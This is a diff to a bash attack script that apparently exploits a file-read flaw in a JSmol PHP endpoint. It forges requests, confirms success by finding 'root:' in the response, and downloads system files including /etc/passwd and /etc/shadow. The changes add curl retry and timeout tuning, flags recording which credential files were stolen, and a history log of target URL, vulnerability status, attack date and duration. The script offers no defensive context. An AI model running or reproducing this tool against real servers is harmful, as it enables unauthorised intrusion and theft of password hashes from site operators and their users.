@@ -12,7 +12,7 @@ function forgeRequest {
 function sendRequest {
 	#curl -f : don't chow pages if reponse different from "200 OK"
 	this_forged_request="$1"
-	curl -ks -f --connect-timeout "$curl_ttl" --retry-max-time "$curl_ttl" "$this_forged_request" -o "$curl_output_filename"
+	curl -ks -f --connect-timeout "$curl_ttl" --retry-max-time "$curl_ttl" --expect100-timeout "$curl_ttl" --happy-eyeballs-timeout-ms "$curl_ttl" --retry "$curl_retry" -o "$curl_output_filename" "$this_forged_request"
 	}
 function checkResult {
 	this_check=$(cat "$curl_output_filename" 2>/dev/null | grep "root:")
@@ -72,7 +72,7 @@ function downloadFiles {
 	total_files_being_dl=0
 	for dl_file in ${download_files[*]};do
 		total_files_being_dl=$(( $total_files_being_dl+1 ))
-		#dl_filename=$(echo "$dl_file"|rev|cut -d '/' -f 1|rev)
+		dl_short_filename=$(echo "$dl_file"|rev|cut -d '/' -f 1|rev)
 		dl_filename=$(echo "$dl_file"|sed 's/\//_/g'|sed 's/\.\./parent/g')
 		dl_dest="$download_folder/$this_dl_sub_folder/$dl_filename"
 		pct_dl=$(($total_files_being_dl*100/$total_files_to_dl))
@@ -83,6 +83,15 @@ function downloadFiles {
 		if [ "$check_size" != "OK" ];then
 			echo -e "$c_error$check_size$c_reset"
 			rm -f "$dl_dest"
+			if [ "$dl_file" = "/etc/passwd" ] || [ "$dl_file" = "/etc/passwd-" ];then
+				got_passwd='TRUE'
+			fi
+			if [ "$dl_file" = "/etc/shadow" ] || [ "$dl_file" = "/etc/shadow-" ];then
+				got_shadow='TRUE'
+			fi
+			if [ "$dl_file" = "/etc/group" ] || [ "$dl_file" = "/etc/group-" ];then
+				got_group='TRUE'
+			fi
 		else
 			total_files_downloaded=$(( $total_files_downloaded+1 ))
 			echo -e "$c_text$check_size$c_reset"
@@ -127,6 +136,11 @@ function checkFolders {
 	else
 		showTitle "Folder $download_folder/$dl_sub_folder" "Already exists" "2"
 	fi
+	}
+function saveToHistory {
+	#URL;VULNERABLE;PASSWD;SHADOW;GROUP;DATE;DURATION
+	history_line="$jsmolphp_url;$is_vuln;$got_passwd;$got_shadow;$got_group;$attack_date_start;$attack_duration"
+	echo -e "$history_line" >> "$history_file" 
 	}
 function showTitle {
 	this_label="$1"
